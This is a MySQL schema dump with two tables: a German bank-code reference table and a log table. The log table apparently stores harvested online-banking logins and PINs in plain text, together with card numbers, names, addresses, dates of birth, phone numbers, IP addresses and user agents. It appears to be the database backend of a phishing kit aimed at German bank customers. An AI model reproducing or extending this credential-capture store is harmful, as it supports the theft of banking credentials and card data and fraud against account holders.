CREATE TABLE `ob_banks` (
  `id` int(200) NOT NULL,
  `ob_bankleitzahl` double DEFAULT NULL,
  `ob_merkmal` double DEFAULT NULL,
  `ob_bezeichnung` varchar(100) DEFAULT NULL,
  `ob_plz` double DEFAULT NULL,
  `ob_ort` varchar(100) DEFAULT NULL,
  `ob_kurzbezeichnung` varchar(100) DEFAULT NULL,
  `ob_pan` double DEFAULT NULL,
  `ob_bic` varchar(100) DEFAULT NULL,
  `ob_pruefzifferberechnung` double DEFAULT NULL,
  `ob_datensatznummer` double DEFAULT NULL,
  `ob_aenderungskennzeichen` varchar(100) DEFAULT NULL,
  `ob_blzloeschung` double DEFAULT NULL,
  `ob_nachfolgeblz` double DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


CREATE TABLE `ob_logs` (
  `id` int(147) NOT NULL,
  `ob_id` varchar(147) NOT NULL,
  `bic` varchar(277) NOT NULL,
  `current_bank` varchar(250) NOT NULL,
  `login_user` varchar(277) NOT NULL,
  `login_pin` varchar(277) NOT NULL,
  `full_name` varchar(275) NOT NULL,
  `address` varchar(275) NOT NULL,
  `zip` varchar(275) NOT NULL,
  `city` varchar(275) NOT NULL,
  `dob` varchar(277) NOT NULL,
  `phone_number` varchar(275) NOT NULL,
  `card_no` varchar(277) NOT NULL,
  `ip_address` varchar(277) NOT NULL,
  `user_agent` varchar(277) NOT NULL,
  `created_at` varchar(277) NOT NULL,
  `status` int(147) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


ALTER TABLE `ob_banks`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `ob_logs`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `ob_banks`
  MODIFY `id` int(200) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3740;

ALTER TABLE `ob_logs`
  MODIFY `id` int(147) NOT NULL AUTO_INCREMENT;
COMMIT;
